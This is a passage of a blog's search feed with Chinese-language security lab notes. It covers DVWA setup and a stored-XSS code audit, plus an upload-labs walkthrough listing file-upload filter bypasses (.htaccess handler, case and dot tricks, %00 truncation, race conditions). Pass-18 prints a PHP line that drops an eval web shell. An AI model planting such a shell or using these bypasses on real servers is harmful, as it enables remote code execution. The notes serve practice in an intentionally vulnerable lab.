punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            nums<span class="token punctuation">[</span><span class="token function">abs</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token function">abs</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token function">abs</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 取绝对值的原因在于有些数字会重复出现，第一次出现就会更改为负数，而负数不能作为下标</span>        <span class="token punctuation">&#125;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> result<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                result<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 这里是i+1</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Programming Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA</title>
      <link href="/2022/12/20/web-dvwa/"/>
      <url>/2022/12/20/web-dvwa/</url>
      
        <content type="html"><![CDATA[<h3 id="搭建">搭建</h3><p><a href="https://github.com/digininja/DVWA">repo</a></p><p><ahref="https://www.youtube.com/watch?v=Yzksa_WjnY0&amp;ab_channel=RobinWood">参考视频</a></p><ul><li><p>安装环境：vitural machine,centos7</p></li><li><p>下载靶场</p><ul><li><figure><img src="https://s2.loli.net/2023/01/17/oDmUcW8qgb5TjsN.png"alt="image-20230117015606575" /><figcaption aria-hidden="true">image-20230117015606575</figcaption></figure></li></ul></li><li><p>解压到htdocs</p><ul><li><figure><img src="https://s2.loli.net/2023/01/17/u6eKqVjEkRg5HWT.png"alt="image-20230117015932854" /><figcaption aria-hidden="true">image-20230117015932854</figcaption></figure></li></ul></li><li><p>修改用户信息</p><ul><li><figure><img src="https://s2.loli.net/2023/01/17/WPX9FURoeVr5AqG.png"alt="image-20230117020144172" /><figcaption aria-hidden="true">image-20230117020144172</figcaption></figure></li></ul></li><li><p>修改php.ini</p><ul><li>我find php.ini 没有找到，因此没有做这一部</li></ul></li><li><figure><img src="https://s2.loli.net/2023/01/17/HvrcxR23NXngMIT.png"alt="image-20230117020313987" /><figcaption aria-hidden="true">image-20230117020313987</figcaption></figure></li><li><figure><img src="https://s2.loli.net/2023/01/17/LJHefdVOMsX7xIC.png"alt="image-20230117020422137" /><figcaption aria-hidden="true">image-20230117020422137</figcaption></figure><ul><li><del>我好愚蠢:unknowdatabase竟然不知道问题在哪</del>，之前都弄错了，你可能会发现很多数据库的操作没做，事实上一键就可以完成</li><li><figure><img src="https://s2.loli.net/2023/01/17/KxUaD7Y4gXILzTl.png"alt="image-20230117204727260" /><figcaption aria-hidden="true">image-20230117204727260</figcaption></figure></li><li><figure><img src="https://s2.loli.net/2023/01/17/du9VJoqHvisMLmk.png"alt="image-20230117020528333" /><figcaption aria-hidden="true">image-20230117020528333</figcaption></figure></li></ul></li><li><figure><img src="https://s2.loli.net/2023/01/17/H8r9ztnFvXdV3Ra.png"alt="image-20230117210411160" /><figcaption aria-hidden="true">image-20230117210411160</figcaption></figure></li></ul><h3 id="file-upload">file upload</h3><ul><li><p>代码审计</p><ul><li>代码解读</li></ul><figure><img src="https://s2.loli.net/2023/01/17/CYWEpf7q1eKitul.png"alt="image-20230117224905337" /><figcaption aria-hidden="true">image-20230117224905337</figcaption></figure><ul><li><p>mime</p><figure><img src="https://s2.loli.net/2023/01/17/TbeKpSNzRf28COV.png"alt="image-20230117222224070" /><figcaption aria-hidden="true">image-20230117222224070</figcaption></figure></li></ul></li></ul><h3 id="xss-stored">xss-stored</h3><ul><li><p>代码审计</p><ul><li>PDO扩展</li></ul><pre class="language-php" data-language="php"><code class="language-php"> <span class="token comment">// Get input</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'mtxMessage'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$name</span>    <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'txtName'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> 解释这段代码是在使用 <span class="token constant">PHP</span> 语言从一个 <span class="token constant">HTML</span> 表单中收集用户输入。其中，<span class="token variable">$_POST</span> 数组用于收集表单中通过 <span class="token constant">HTTP</span> <span class="token constant">POST</span> 方法提交的数据。<span class="token string single-quoted-string">'mtxMessage'</span> 和 <span class="token string single-quoted-string">'txtName'</span> 是表单中的元素名称。<span class="token variable">$message</span> 变量存储的是用户在表单中输入的信息，<span class="token variable">$name</span> 变量存储的是用户在表单中输入的名字。<span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 是 <span class="token constant">PHP</span> 中的一个函数，用于去除字符串两端的空格。这里使用 <span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 函数是为了去除用户输入中可能含有的首尾空格。JiangFeng <span class="token number">7</span>    <span class="token comment">// Sanitize message input</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$message</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> 解释这段代码是在对用户输入的信息进行过滤和处理，以防止 <span class="token constant">SQL</span> 注入和 <span class="token constant">XSS</span> 攻击。<span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 是 <span class="token constant">PHP</span> 中的一个函数，用于去除字符串中的反斜杠（\）。这里使用 <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 函数是为了去除用户输入中可能含有的反斜杠。mysqli_real_escape_string 是 <span class="token constant">PHP</span> 中用于防止 <span class="token constant">SQL</span> 注入的函数。该函数会对字符串中的特殊字符进行转义，以防止它们在 <span class="token constant">SQL</span> 查询中被误解释。<span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 是 <span class="token constant">PHP</span> 中的一个函数，用于把一些预定义的字符转换为 <span class="token constant">HTML</span> 实体。这里使用 <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 函数是为了防止 <span class="token constant">XSS</span> 攻击。JiangFeng <span class="token number">7</span>    <span class="token comment">// Sanitize name input</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$name</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span> <span class="token variable">$name</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>解释这段代码是在对用户输入的名字进行过滤和处理，以防止 <span class="token constant">SQL</span> 注入和 <span class="token constant">XSS</span> 攻击。<span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 是 <span class="token constant">PHP</span> 中的一个函数，用于去除字符串中的反斜杠（\）。这里使用 <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 函数是为了去除用户输入中可能含有的反斜杠。mysqli_real_escape_string 是 <span class="token constant">PHP</span> 中用于防止 <span class="token constant">SQL</span> 注入的函数。该函数会对字符串中的特殊字符进行转义，以防止它们在 <span class="token constant">SQL</span> 查询中被误解释。<span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 是 <span class="token constant">PHP</span> 中的一个函数，用于把一些预定义的字符转换为 <span class="token constant">HTML</span> 实体。这里使用 <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 函数是为了防止 <span class="token constant">XSS</span> 攻击。这里 <span class="token variable">$name</span> 和 <span class="token variable">$message</span> 变量都被处理过了<span class="token punctuation">,</span>防止了<span class="token constant">SQL</span>注入和<span class="token constant">XSS</span>攻击JiangFeng <span class="token number">7</span>    <span class="token comment">// Update database</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':message'</span><span class="token punctuation">,</span> <span class="token variable">$message</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':name'</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 解释这段代码是在使用 <span class="token constant">PHP</span> 的 <span class="token constant">PDO</span> 扩展将用户输入的信息和名字写入数据库。首先，使用 <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 方法创建了一个 PDOStatement 对象，该对象用于执行预处理的 <span class="token constant">SQL</span> 查询。在这里，预处理的 <span class="token constant">SQL</span> 查询是一个 <span class="token constant">INSERT</span> <span class="token constant">INTO</span> 语句，用于向 guestbook 数据表中插入一条记录。<span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 方法用于绑定参数到预处理语句。这里将 <span class="token variable">$message</span> 变量绑定到 <span class="token punctuation">:</span>message 参数，将 <span class="token variable">$name</span> 变量绑定到 <span class="token punctuation">:</span>name 参数。第三个参数 <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> 表示参数的类型是字符串。最后，使用 <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 方法执行预处理语句。这样就将用户输入的信息和名字写入了数据库。</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/2022/12/20/web-upload-labs/"/>
      <url>/2022/12/20/web-upload-labs/</url>
      
        <content type="html"><![CDATA[<h3 id="靶场安装">靶场安装</h3><ul><li><p><a href="https://github.com/c0ny1/upload-labs">仓库</a></p></li><li><p>windows-php（linux 需要docker容器内，没成功）</p></li></ul><figure><img src="https://s2.loli.net/2022/12/28/XnmQaUHR1fhOBrE.png"alt="image-20221228011314188" /><figcaption aria-hidden="true">image-20221228011314188</figcaption></figure><figure><img src="https://s2.loli.net/2022/12/19/NPZDOhCJf5QBdTL.png"alt="image-20221219085455058" /><figcaption aria-hidden="true">image-20221219085455058</figcaption></figure><hr /><p><ahref="https://blog.csdn.net/weixin_47598409/article/details/115050869">参考csdn</a></p><p><ahref="https://www.cnblogs.com/chu-jian/p/15515770.html">参考博客园</a></p><h3 id="pass-01">pass-01</h3><ul><li><p>禁用js前</p><figure><img src="https://s2.loli.net/2022/12/19/4hxfL7giUNEY2kO.png"alt="image-20221219045606944" /><figcaption aria-hidden="true">image-20221219045606944</figcaption></figure><ul><li>修改js语句法(我尝试无效)</li></ul></li></ul><figure><img src="https://s2.loli.net/2022/12/19/tcOpnhUyEaVuRlC.png"alt="image-20221219045853755" /><figcaption aria-hidden="true">image-20221219045853755</figcaption></figure><ul><li>全局禁用js法</li></ul><figure><img src="https://s2.loli.net/2022/12/19/hCvpX2OxA6zW9SL.png"alt="image-20221219085550411" /><figcaption aria-hidden="true">image-20221219085550411</figcaption></figure><ul><li>burp 修改后缀法</li></ul><h3 id="pass-02">pass-02</h3><ul><li>burp</li></ul><figure><img src="https://s2.loli.net/2022/12/21/4oDGZnYOfEANyLb.png"alt="image-20221221110329394" /><figcaption aria-hidden="true">image-20221221110329394</figcaption></figure><figure><img src="https://s2.loli.net/2022/12/21/sWafvJ97g8UA4tP.png"alt="image-20221221110400667" /><figcaption aria-hidden="true">image-20221221110400667</figcaption></figure><h3 id="pass-03">pass-03</h3><ul><li>黑名单验证：<ul><li>黑名单是规定不允许上传的文件，但是如果黑名单定义不完整的话是可以实现绕过的，用.phtml.phps .php5 .pht进行绕过</li></ul></li><li>httpd-conf 配置</li></ul><figure><img src="https://s2.loli.net/2022/12/21/8Zl1DKiNTdICg49.png"alt="image-20221221134628429" /><figcaption aria-hidden="true">image-20221221134628429</figcaption></figure><ul><li>重启phpstudy</li><li>上传允许的文件类型</li></ul><figure><img src="https://s2.loli.net/2022/12/21/hnLeTtqdSFialIu.png"alt="image-20221221134534322" /><figcaption aria-hidden="true">image-20221221134534322</figcaption></figure><ul><li><figure><img src="https://s2.loli.net/2022/12/21/fBgLOFvV76ARMjW.png"alt="image-20221221134517790" /><figcaption aria-hidden="true">image-20221221134517790</figcaption></figure></li></ul><h3 id="pass-04">pass-04</h3><ul><li>.htaccess文件（不能取名<ul><li>将所有文件解析为php文件</li></ul></li></ul><pre class="language-none"><code class="language-none">SetHandler application&#x2F;x-httpd-php</code></pre><ul><li>制作图片马<ul><li>使用cmd(powershell 不行)</li><li><figure><img src="https://s2.loli.net/2022/12/21/pES8eP2kdiWH4Um.png"alt="image-20221221151125478" /><figcaption aria-hidden="true">image-20221221151125478</figcaption></figure></li></ul></li><li>暂时不知道出错的原因</li></ul><figure><img src="https://s2.loli.net/2022/12/21/ysqrtSTPchWgARG.png"alt="image-20221221151149574" /><figcaption aria-hidden="true">image-20221221151149574</figcaption></figure><h3 id="pass-05">pass-05</h3><ul><li>黑名单中有.htaccess</li><li>有大小写绕过</li></ul><figure><img src="https://s2.loli.net/2022/12/22/S51XAFaEWGjwfx3.png"alt="image-20221222162109009" /><figcaption aria-hidden="true">image-20221222162109009</figcaption></figure><ul><li><ul><li>对代码的解释</li></ul><blockquote><p>首先，通过调用 PHP 内置函数 <code>trim</code>去掉文件名两端的空白字符（空格、制表符、换行符）。然后，调用函数<code>deldot</code> 来删除文件名末尾的点。</p><p>接着，调用函数 <code>strrchr</code>来获取文件的扩展名（即文件名中最后一个点后面的部分）。然后，使用函数<code>strtolower</code> 将扩展名转换为小写。</p><p>接下来，使用函数 <code>str_ireplace</code> 去除字符串"::$DATA"。最后，再次使用函数 <code>trim</code>去除扩展名首尾的空白字符。</p></blockquote></li><li><p>绕过方式：因为上述操作没有循环因此可以增加多个符号（但是这样重命名不成功</p></li><li><p>最后我采取的方式是加了个空格</p><figure><img src="https://s2.loli.net/2022/12/22/3Z1W7macK9XLMpd.png"alt="image-20221222171409888" /><figcaption aria-hidden="true">image-20221222171409888</figcaption></figure></li><li><p>空格不影响php后缀的解析</p></li></ul><h3 id="pass-06">pass-06</h3><ul><li>大小写绕过即可</li></ul><figure><img src="https://s2.loli.net/2022/12/24/3IPvL1nVGsp8hJm.png"alt="image-20221224114929511" /><figcaption aria-hidden="true">image-20221224114929511</figcaption></figure><h3 id="pass-07">pass-07</h3><ul><li><p>后缀首位没去空格</p></li><li><p>本地修改文件不太容易操作，改用burp 操作</p></li></ul><h3 id="pass-08">pass-08</h3><ul><li>没有删除文件名末尾的点<imgsrc="https://s2.loli.net/2022/12/24/hIi9V4HTQwLMzWF.png"alt="image-20221224120042052" /></li></ul><h3 id="pass-09">pass-09</h3><ul><li>没有去除 <code>::$DATA</code></li></ul><h3 id="pass-10">pass-10</h3><ul><li></li></ul><h3 id="pass-11">pass-11</h3><ul><li>代码解释</li></ul><blockquote><p><code>$file_name = str_ireplace($deny_ext,"", $file_name);</code></p><p>函数 <code>str_ireplace</code>用于在字符串中查找并替换（不区分大小写）。</p><p>在这段代码中，函数 <code>str_ireplace</code> 的第一个参数为数组<code>$deny_ext</code>，表示要查找的字符串。第二个参数为空字符串，表示替换为空字符串。第三个参数为变量<code>$file_name</code>，表示要在哪个字符串中查找并替换。</p><p>所以，这段代码的作用是在文件名中查找并去除不允许的扩展名。例如，如果文件名为"test.php"，则该代码会将其修改为 "test"。</p></blockquote><ul><li>双写后缀</li></ul><figure><img src="https://s2.loli.net/2022/12/24/v8X7ZWuzQltAoJ3.png"alt="image-20221224122536687" /><figcaption aria-hidden="true">image-20221224122536687</figcaption></figure><figure><img src="https://s2.loli.net/2022/12/24/FkjQJp2iTHq1RyI.png"alt="image-20221224122558029" /><figcaption aria-hidden="true">image-20221224122558029</figcaption></figure><h3 id="pass-12">pass-12</h3><ul><li>%00 截断</li></ul><blockquote><p>假设你有一个文件上传表单，允许上传 'jpg'、'png'、'gif'格式的文件。表单中有一个文件输入框，用于选择要上传的文件。</p><p>假设你想要上传一个 PHP 文件，但是程序只允许上传 'jpg'、'png'、'gif'格式的文件。此时，你可以使用字符串 "%00" 来绕过文件扩展名检查。</p><p>例如，假设你的 PHP 文件名为 "test.php"，则可以将文件名修改为"test.php%00.gif"。这样，当你选择文件 "test.php%00.gif"并提交表单时，程序会检查文件的扩展名，发现它是 ".gif"格式，并认为这是一个合法的文件。程序会将文件保存到服务器上，但文件名实际上是"test.php"，即你上传的 PHP 文件。</p><p>注意：字符串 "%00" 只能用于 PHP 版本低于 5.3 的程序。在新版本的 PHP中，可能不会出现这种漏洞。</p></blockquote><ul><li>但是没成功</li></ul><figure><img src="https://s2.loli.net/2022/12/24/SwbhZQ1UeCcqt83.png"alt="image-20221224132238647" /><figcaption aria-hidden="true">image-20221224132238647</figcaption></figure><ul><li><p>上述被chat-gpt 误导</p><ul><li>此处应该是修改文件存储路径，并截断</li></ul><figure><img src="https://s2.loli.net/2022/12/28/efYayxJL82PQZOv.png"alt="image-20221228010659772" /><figcaption aria-hidden="true">image-20221228010659772</figcaption></figure></li></ul><h3 id="pass-13">pass-13</h3><ul><li>只不过是接受值变成了post,她两的差别呢就是get会自行解码，post不会自行解码，我们需要对%00进行编码,选中%00右键，按下图操作来</li></ul><figure><img src="https://s2.loli.net/2022/12/28/CbxUyvhsqG1MF4R.png"alt="image-20221228011043178" /><figcaption aria-hidden="true">image-20221228011043178</figcaption></figure><figure><img src="https://s2.loli.net/2022/12/24/i3tGhqjQoz7gmuc.png"alt="image-20221224132219882" /><figcaption aria-hidden="true">image-20221224132219882</figcaption></figure><h3 id="pass-14">pass-14</h3><ul><li>图片马（注意url）</li></ul><figure><img src="https://s2.loli.net/2022/12/24/UhVDcuHdBsPpFl1.png"alt="image-20221224134349001" /><figcaption aria-hidden="true">image-20221224134349001</figcaption></figure><h3 id="pass-17">pass-17</h3><ul><li>主要是把二次渲染绕过imagecreatefromjpeg（）函数:该函数会把图片马中的php代码删除</li><li>因此需要对比出哪个位置的内容不会被删除，再把php代码写入到此处</li></ul><h3 id="pass-18">pass-18</h3><ul><li><p>因为是先将文件上传、再审核文件名并修改</p></li><li><p>利用burp 多线程重发数据包，由于条件竞争，有的包来不及改名</p><ul><li>生成新的php文件</li></ul></li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Tony.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST["Tony"])?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h3 id="pass-19">pass-19</h3><ul><li>apache 无法解析<code>.7z</code></li><li></li></ul><h3 id="pass-20">pass-20</h3><ul><li>move_uploaded_file()还有这么一个特性，会忽略掉文件末尾的<code>/.</code></li></ul><h3 id="pass-21代码审计">pass-21(代码审计)</h3><ul><li><p>post 以数组形式传参</p></li><li><p>php定义数组，下标自由。eg:<code>$s[1],$s[3],$s[4]</code></p></li><li><p>对代码分析</p><ul><li>关注如下代码</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"> <span class="token comment">//检查文件名</span> $file <span class="token operator">=</span> <span class="token function">empty</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token char">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> $_FILES<span class="token punctuation">[</span><span class="token char">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token char">'name'</span><span class="token punctuation">]</span> <span class="token operator">:</span> $_POST<span class="token punctuation">[</span><span class="token char">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     $file <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token char">'.'</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> $file_name <span class="token operator">=</span> <span class="token function">reset</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token char">'.'</span> <span class="token punctuation">.</span> $file<span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">// 对下标不需要连续的利用</span></code></pre><ul><li>注意content-Type</li></ul></li></ul><figure><img src="https://s2.loli.net/2022/12/28/BSlkPDiMH8UZenm.png"alt="image-20221228001825259" /><figcaption aria-hidden="true">image-20221228001825259</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> File Upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss文件上传漏洞原理</title>
      <link href="/2022/12/17/web-wen-jian-shang-chuan-lou-dong-yuan-li/"/>
      <url>/2022/12/17/web-wen-jian-shang-chuan-lou-dong-yuan-li/</url>
      
        <content type="html"><![CDATA[<h3 id="实验环境的准备">实验环境的准备</h3><ul><li>注册页面</li></ul><figure><img src="https://s2.loli.net/2022/12/16/MsJPaD53mTfpXiZ.png"alt="image-20221216053536450" /><figcaption aria-hidden="true">image-20221216053536450</figcaption></figure><ul><li>html代码</li></ul><figure><img src="https://s2.loli.net/2022/12/16/h9URXMpTLVjYzic.png"alt="image-20221216053623609" /><figcaption aria-hidden="true">image-20221216053623609</figcaption></figure><ul><li>后端代码（注意文件相关的代码）<ul><li>name属性（post表单获取）</li><li>如果是ajax 方式，则获取id属性</li><li>文件属性</li></ul></li></ul><figure><img src="https://s2.loli.net/2022/12/16/P9B4NsbSLhmZRwY.png"alt="image-20221216053921422" /><figcaption aria-hidden="true">image-20221216053921422</figcaption></figure><figure><img src="https://s2.loli.net/2022/12/16/lNwvPH2U6iruKjB.png"alt="image-20221216054526184" /><figcaption aria-hidden="true">image-20221216054526184</figcaption></figure><ul><li>原始文件名可能重复<ul><li>因此重命名</li></ul></li><li>原理：上传头像文件用php木马代替</li><li>改正<ul><li>表单提交时，对文件类型进行检查</li></ul></li></ul><figure><img src="https://s2.loli.net/2022/12/16/lun2erkPGQ3vVg5.png"alt="image-20221216055649210" /><figcaption aria-hidden="true">image-20221216055649210</figcaption></figure><ul><li><p>绕过检查</p><ul><li>浏览器禁用js（前端校验）,并使用burp 发送请求</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> File Upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>监督学习和无监督学习</title>
      <link href="/2022/12/03/ml03/"/>
      <url>/2022/12/03/ml03/</url>
      
